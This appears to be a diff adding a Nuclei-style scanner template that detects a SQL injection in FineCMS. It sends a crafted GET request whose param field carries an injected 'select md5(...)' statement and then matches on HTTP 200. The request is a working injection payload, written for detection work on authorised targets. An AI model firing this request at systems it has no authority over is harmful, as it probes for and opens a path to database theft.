@@ -1,0 +1,21 @@
+id: poc-yaml-finecms-sqli
+
+info:
+  name: poc-yaml-finecms-sqli
+  author: Rexus
+  severity: high
+  tags: xray-converted,sqli,ct-158611
+  reference:
+    - https://blog.csdn.net/dfdhxb995397/article/details/101385340
+
+http:
+  - raw:
+      - |
+        GET /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand_int(1000, 9999)}})%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
